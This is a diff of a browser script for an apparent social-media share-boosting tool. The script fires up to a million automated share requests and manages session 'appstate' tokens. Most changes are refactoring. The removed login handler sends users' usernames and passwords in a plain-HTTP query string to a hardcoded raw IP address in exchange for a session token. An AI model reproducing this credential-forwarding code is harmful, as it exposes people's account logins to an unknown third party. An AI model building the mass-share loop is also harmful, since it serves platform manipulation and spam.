@@ -7,17 +7,8 @@ document.getElementById("shareForm").addEventListener("submit", function (e) {
     const interval = parseFloat(document.getElementById("interval").value);
     const shares = parseInt(document.getElementById("shares").value, 10);
 
-    // Validate shares
-    if (shares < 1 || shares > 1000000) {
-        alert("The number of shares must be between 1 and 1,000,000.");
-        return;
-    }
-
-    // Validate interval
-    if (isNaN(interval) || interval <= 0) {
-        alert("Please provide a valid interval greater than 0 seconds.");
-        return;
-    }
+    // Validate inputs
+    if (!validateInputs(shares, interval)) return;
 
     const progressContainer = document.getElementById("progress-container");
 
@@ -26,14 +17,14 @@ document.getElementById("shareForm").addEventListener("submit", function (e) {
     progressBarWrapper.classList.add("mb-3");
     const progressBar = document.createElement("div");
     progressBar.classList.add("progress");
-    const progress = document.createElement("div");
-    progress.classList.add("progress-bar");
-    progress.setAttribute("role", "progressbar");
-    progress.setAttribute("aria-valuenow", "0");
-    progress.setAttribute("aria-valuemin", "0");
-    progress.setAttribute("aria-valuemax", "100");
-    progress.style.width = "0%";
-    progressBar.appendChild(progress);
+    const progressElement = document.createElement("div");
+    progressElement.classList.add("progress-bar");
+    progressElement.setAttribute("role", "progressbar");
+    progressElement.setAttribute("aria-valuenow", "0");
+    progressElement.setAttribute("aria-valuemin", "0");
+    progressElement.setAttribute("aria-valuemax", "100");
+    progressElement.style.width = "0%";
+    progressBar.appendChild(progressElement);
     progressBarWrapper.appendChild(progressBar);
     progressContainer.appendChild(progressBarWrapper);
 
@@ -43,8 +34,8 @@ document.getElementById("shareForm").addEventListener("submit", function (e) {
     const intervalId = setInterval(function () {
         if (completedShares < shares) {
             const progressPercentage = ((completedShares + 1) / shares) * 100;
-            progress.style.width = `${progressPercentage}%`;
-            progress.textContent = `${Math.floor(progressPercentage)}%`;
+            progressElement.style.width = `${progressPercentage}%`;
+            progressElement.textContent = `${Math.floor(progressPercentage)}%`;
 
             // API request for each share using Axios
             axios
@@ -56,7 +47,13 @@ document.getElementById("shareForm").addEventListener("submit", function (e) {
                     console.log(`Share ${completedShares + 1} processed`);
                 })
                 .catch((error) => {
-                    console.error("Error during share:", error);
+                    if (error.response) {
+                        console.error("Server responded with:", error.response.data);
+                    } else if (error.request) {
+                        console.error("No response received:", error.request);
+                    } else {
+                        console.error("Error setting up the request:", error.message);
+                    }
                 });
 
             completedShares++;
@@ -67,35 +64,20 @@ document.getElementById("shareForm").addEventListener("submit", function (e) {
     }, interval * 1000);
 });
 
-// Handle submission button status
-async function handleSubmission(event, buttonId, apiUrl, requestData) {
-    const button = document.getElementById(buttonId);
-    if (!button) {
-        console.error("Button element not found");
-        return;
+// Validate input values
+function validateInputs(shares, interval) {
+    if (shares < 1 || shares > 1000000) {
+        alert("The number of shares must be between 1 and 1,000,000.");
+        return false;
     }
-    try {
-        button.innerText = "Submitting...";
-        const response = await fetch(apiUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(requestData),
-        });
-
-        const data = await response.json();
-        if (data.status === 200) {
-            button.innerText = "Submitted";
-        } else {
-            button.innerText = "Submit";
-            console.error("Submission failed:", data);
-        }
-    } catch (error) {
-        console.error("Error:", error);
-        button.innerText = "Submit";
+    if (isNaN(interval) || interval <= 0) {
+        alert("Please provide a valid interval greater than 0 seconds.");
+        return false;
     }
+    return true;
 }
 
-// Link progress tracking
+// Function to update progress for ongoing links
 async function linkOfProcessing() {
     try {
         const container = document.getElementById("processing");
@@ -131,6 +113,7 @@ async function linkOfProcessing() {
 
                 if (!updateResponse.ok) {
                     console.error(`Failed to fetch update: ${updateResponse.status} - ${updateResponse.statusText}`);
+                    clearInterval(intervalId); // Stop interval on failure
                     return;
                 }
 
@@ -155,38 +138,6 @@ function update(card, count, id, index, target) {
         container.textContent = `${index + 1}. ID: ${id} | ${count}/${target}`;
     }
 }
-
-// Initial processing call
-linkOfProcessing();
-
-// Handle login form submission
-document.getElementById("login-form")?.addEventListener("submit", async function (event) {
-    event.preventDefault();
-    const button = document.getElementById("login-button");
-    const username = document.getElementById("username").value.trim();
-    const password = document.getElementById("password").value.trim();
-
-    try {
-        button.innerText = "Logging In...";
-        const response = await fetch(`http://65.109.58.118:26011/api/appstate?e=${username}&p=${password}`, {
-            method: "GET",
-        });
-        const data = await response.json();
-
-        if (data.success) {
-            document.getElementById("result-container").style.display = "block";
-            document.getElementById("appstate").innerText = data.success;
-            alert("Login Success. Click OK to continue.");
-            button.innerText = "Logged In";
-            document.getElementById("copy-button").style.display = "block";
-        } else {
-            alert("Failed to retrieve appstate. Please check your credentials and try again.");
-        }
-    } catch (error) {
-        console.error("Error retrieving appstate:", error);
-        alert("An error occurred. Please try again later.");
-    }
-});
 
 // Copy appstate to clipboard
 document.getElementById("copy-button").addEventListener("click", function () {
